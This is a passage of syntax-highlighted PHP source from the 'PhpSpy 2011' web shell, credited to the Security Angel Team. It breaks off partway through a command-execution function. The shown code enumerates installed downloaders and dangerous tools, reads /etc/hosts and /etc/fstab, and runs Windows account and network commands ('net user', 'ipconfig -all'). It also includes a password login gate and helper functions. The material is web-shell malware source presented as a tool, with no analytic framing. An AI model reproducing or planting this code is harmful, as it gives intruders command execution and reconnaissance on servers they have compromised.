<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">which(</span>$<span style="color: #e7c547;">item</span>)){$<span style="color: #e7c547;">temp</span>[]=$<span style="color: #e7c547;">item</span>;}
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Userful'</span>, <span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">', '</span>,$<span style="color: #e7c547;">temp</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">danger</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">item</span>)
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">which(</span>$<span style="color: #e7c547;">item</span>)){$<span style="color: #e7c547;">temp</span>[]=$<span style="color: #e7c547;">item</span>;}
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Danger'</span>, <span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">', '</span>,$<span style="color: #e7c547;">temp</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">temp</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">downloaders</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">item</span>)<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">which(</span>$<span style="color: #e7c547;">item</span>)){$<span style="color: #e7c547;">temp</span>[]=$<span style="color: #e7c547;">item</span>;}
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Downloaders'</span>, <span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">', '</span>,$<span style="color: #e7c547;">temp</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Hosts'</span>, @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span><span style="color: #70c0b1;">'/etc/hosts'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'HDD space'</span>, <span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'df -h'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Mount options'</span>, @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span><span style="color: #70c0b1;">'/etc/fstab'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'OS Version'</span>,<span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'ver'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'Account Settings'</span>,<span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'net accounts'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'User Accounts'</span>,<span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'net user'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">secparam(</span><span style="color: #70c0b1;">'IP Configurate'</span>,<span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'ipconfig -all'</span>));
<span style="background-color: #424242;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Undefined Action'</span>);
}

<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #7aa6da;">&lt;div</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #70c0b1; text-decoration: underline;">background:#eee;"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;span</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"float:right;"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #c397d8;">&lt;?php</span> <span style="color: #eaeaea; background-color: #000000;">debuginfo(</span>);<span style="color: #eaeaea; background-color: #000000;">ob_end_flush(</span>);<span style="color: #c397d8;">?&gt;</span><span style="color: #7aa6da;">&lt;/span&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">Powered</span> <span style="color: #d54e53; font-weight: bold;">by</span> <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">title=</span><span style="color: #70c0b1;">"Build 20110502"</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"http://www.4ngel.net"</span> <span style="color: #7aa6da;">target=</span><span style="color: #70c0b1;">"_bl</span><span style="color: #70c0b1; text-decoration: underline;">ank"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b9ca4a; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">str_replace(</span><span style="color: #70c0b1; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">2011</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;">. </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">Copyright (</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">C</span><span style="text-decoration: underline;">) </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">2004</span><span style="text-decoration: underline;">-</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">2011</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">&lt;a</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">href=</span><span style="color: #70c0b1; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">target=</span><span style="color: #70c0b1; text-decoration: underline;">"_blank"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">Security</span><span style="text-decoration: underline;"> </span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">Angel</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">Team [</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">All</span><span style="text-decoration: underline;"> </span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">Rights</span><span style="text-decoration: underline;"> </span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">Reserved</span><span style="text-decoration: underline;">.</span>
<span style="color: #7aa6da;">&lt;/div&gt;</span>
<span style="color: #7aa6da;">&lt;/body&gt;</span>
<span style="color: #7aa6da;">&lt;/html&gt;</span>

<span style="color: #c397d8;">&lt;?php</span>

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">======================================================</span>
<span style="color: #969896; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #969896; font-style: italic;">======================================================*/</span>

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">secparam</span>($<span style="color: #e7c547;">n</span>, $<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">v</span> = <span style="color: #eaeaea; background-color: #000000;">trim(</span>$<span style="color: #e7c547;">v</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;'</span>.$<span style="color: #e7c547;">n</span>.<span style="color: #70c0b1;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">strpos(</span>$<span style="color: #e7c547;">v</span>, <span style="color: #70c0b1;">"\n"</span>) === <span style="color: #7aa6da;">false</span>)
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">v</span>.<span style="color: #70c0b1;">'&lt;br /&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">else</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;pre&gt;'</span>.$<span style="color: #e7c547;">v</span>.<span style="color: #70c0b1;">'&lt;/pre&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/div&gt;'</span>);
<span style="background-color: #424242;"> </span>   }
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">m</span>($<span style="color: #e7c547;">msg</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #70c0b1; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">msg</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">'&lt;/div&gt;'</span>;
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">scookie</span>($<span style="color: #e7c547;">key</span>, $<span style="color: #e7c547;">value</span>, $<span style="color: #e7c547;">life</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>, $<span style="color: #e7c547;">prefix</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">timestamp</span>, $<span style="color: #7aa6da;">_SERVER</span>, $<span style="color: #e7c547;">cookiepre</span>, $<span style="color: #e7c547;">cookiedomain</span>, $<span style="color: #e7c547;">cookiepath</span>, $<span style="color: #e7c547;">cookie</span><span style="color: #e7c547; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">key</span> = ($<span style="color: #e7c547;">prefix</span> ? $<span style="color: #e7c547;">cookiepre</span> : <span style="color: #70c0b1;">''</span>).$<span style="color: #e7c547;">key</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">life</span> = $<span style="color: #e7c547;">life</span> ? $<span style="color: #e7c547;">life</span> : $<span style="color: #e7c547;">cookielife</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">useport</span> = $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SERVER_PORT'</span>] == <span style="color: #eaeaea; background-color: #000000;">443</span> ? <span style="color: #eaeaea; background-color: #000000;">1</span> : <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">setcookie(</span>$<span style="color: #e7c547;">key</span>, $<span style="color: #e7c547;">value</span>, $<span style="color: #e7c547;">timestamp</span>+$<span style="color: #e7c547;">life</span>, $<span style="color: #e7c547;">cookiepath</span>, $<span style="color: #e7c547;">cookiedomain</span>, $<span style="color: #e7c547;">usepo</span><span style="color: #e7c547; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #d54e53; background-color: #424242;">   </span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">multi</span>($<span style="color: #e7c547;">num</span>, $<span style="color: #e7c547;">perpage</span>, $<span style="color: #e7c547;">curpage</span>, $<span style="color: #e7c547;">tablename</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">num</span> &gt; $<span style="color: #e7c547;">perpage</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">page</span> = <span style="color: #eaeaea; background-color: #000000;">10</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">offset</span> = <span style="color: #eaeaea; background-color: #000000;">5</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pages</span> = @<span style="color: #eaeaea; background-color: #000000;">ceil(</span>$<span style="color: #e7c547;">num</span> / $<span style="color: #e7c547;">perpage</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">page</span> &gt; $<span style="color: #e7c547;">pages</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">from</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">to</span> = $<span style="color: #e7c547;">pages</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">from</span> = $<span style="color: #e7c547;">curpage</span> - $<span style="color: #e7c547;">offset</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">to</span> = $<span style="color: #e7c547;">curpage</span> + $<span style="color: #e7c547;">page</span> - $<span style="color: #e7c547;">offset</span> - <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">from</span> &lt; <span style="color: #eaeaea; background-color: #000000;">1</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">to</span> = $<span style="color: #e7c547;">curpage</span> + <span style="color: #eaeaea; background-color: #000000;">1</span> - $<span style="color: #e7c547;">from</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">from</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(($<span style="color: #e7c547;">to</span> - $<span style="color: #e7c547;">from</span>) &lt; $<span style="color: #e7c547;">page</span> &amp;&amp; ($<span style="color: #e7c547;">to</span> - $<span style="color: #e7c547;">from</span>) &lt; $<span style="color: #e7c547;">pages</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">to</span> = $<span style="color: #e7c547;">page</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>($<span style="color: #e7c547;">to</span> <span style="color: #7aa6da;">&gt;</span> $<span style="color: #e7c547;">pages</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">from</span> = $<span style="color: #e7c547;">curpage</span> - $<span style="color: #e7c547;">pages</span> + $<span style="color: #e7c547;">to</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">to</span> = $<span style="color: #e7c547;">pages</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(($<span style="color: #e7c547;">to</span> - $<span style="color: #e7c547;">from</span>) &lt; $<span style="color: #e7c547;">page</span> &amp;&amp; ($<span style="color: #e7c547;">to</span> - $<span style="color: #e7c547;">from</span>) &lt; $<span style="color: #e7c547;">pages</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">from</span> = $<span style="color: #e7c547;">pages</span> - $<span style="color: #e7c547;">page</span> + <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> = ($<span style="color: #e7c547;">curpage</span> - $<span style="color: #e7c547;">offset</span> <span style="color: #7aa6da;">&gt;</span> <span style="color: #eaeaea; background-color: #000000;">1</span> &amp;&amp; $<span style="color: #e7c547;">pages</span> &gt; $<span style="color: #e7c547;">page</span> ? <span style="color: #70c0b1;">'&lt;a href="javas</span><span style="color: #70c0b1; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #e7c547; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;"> ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #e7c547; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span> = $<span style="color: #e7c547;">from</span>; $<span style="color: #e7c547;">i</span> &lt;= $<span style="color: #e7c547;">to</span>; $<span style="color: #e7c547;">i</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> .= $<span style="color: #e7c547;">i</span> == $<span style="color: #e7c547;">curpage</span> ? $<span style="color: #e7c547;">i</span>.<span style="color: #70c0b1;">' '</span> : <span style="color: #70c0b1;">'&lt;a href="javascript:settabl</span><span style="color: #70c0b1; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> .= ($<span style="color: #e7c547;">curpage</span> &lt; $<span style="color: #e7c547;">pages</span> ? <span style="color: #70c0b1;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #e7c547;">ta</span><span style="color: #e7c547; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #e7c547; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #e7c547; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; $</span><span style="color: #e7c547; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #70c0b1; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> = $<span style="color: #e7c547;">multipage</span> ? <span style="color: #70c0b1;">'&lt;p&gt;Pages: '</span>.$<span style="color: #e7c547;">multipage</span>.<span style="color: #70c0b1;">'&lt;/p&gt;'</span> : <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">multipage</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">loginpage</span>() {
<span style="color: #c397d8;">?&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;style</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"text/css"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">input</span> {<span style="color: #d54e53; font-weight: bold;">font</span>:<span style="color: #eaeaea; background-color: #000000;">11</span>px <span style="color: #d54e53; font-weight: bold;">Verdana</span>;<span style="color: #d54e53; font-weight: bold;">BACKGROUND</span>: <span style="color: #969896; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #969896; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/style&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;form</span> <span style="color: #7aa6da;">method=</span><span style="color: #70c0b1;">"POST"</span> <span style="color: #7aa6da;">action=</span><span style="color: #70c0b1;">""</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;span</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"font:11px Verdana;"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Password</span>: <span style="color: #7aa6da;">&lt;/span&gt;&lt;input</span> <span style="color: #7aa6da;">name=</span><span style="color: #70c0b1;">"password"</span> <span style="color: #7aa6da;">typ</span><span style="color: #7aa6da; text-decoration: underline;">e=</span><span style="color: #70c0b1; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">size=</span><span style="color: #70c0b1; text-decoration: underline;">"20"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;input</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"hidden"</span> <span style="color: #7aa6da;">name=</span><span style="color: #70c0b1;">"action"</span> <span style="color: #7aa6da;">value=</span><span style="color: #70c0b1;">"login"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;input</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"submit"</span> <span style="color: #7aa6da;">value=</span><span style="color: #70c0b1;">"Login"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/form&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end loginpage()</span>

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">execute</span>($<span style="color: #e7c547;">cfe</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">cfe</span>) {
